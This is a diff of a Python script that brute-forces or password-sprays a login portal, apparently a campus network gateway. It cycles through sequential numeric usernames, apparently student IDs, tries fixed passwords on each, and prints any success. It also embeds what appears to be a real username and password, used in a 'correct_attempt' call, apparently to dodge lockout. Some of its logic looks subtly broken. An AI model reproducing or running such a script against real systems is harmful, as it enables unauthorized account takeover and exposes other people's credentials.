@@ -8,14 +8,26 @@ def login(user, passwd):
     if x.text[90] == 'Y':
         return f'[+] SUCESS User = {user}, Pass = {passwd}'
     else:
-        return '[-] Failure :('
+        return f'[-] {user%1000} Failure :('
 
 def logout(user):
     req = {'mode': '193', 'username': user}
     x = requests.post(url, data=req)
 
-# for en in range(21103000, 21103100):
-#     print(login(en, "357043AR"))
-#     time.sleep(2)
-#     logout(en)
-#     time.sleep(1)
+def correct_attempt():
+    login("21103085", "179001AS")
+
+for en in range(21103300, 21103400, 2):
+    print(login(en, "357043AR"))
+    time.sleep(1)
+    logout(en)
+    print(login(en, "179001AS"))
+    time.sleep(1)
+    logout(en)
+    print(login(en+1, "179001AS"))
+    time.sleep(1)
+    logout(en)
+    print(login(en+1, "179001AS"))
+    time.sleep(1)
+    logout(en)
+    correct_attempt()
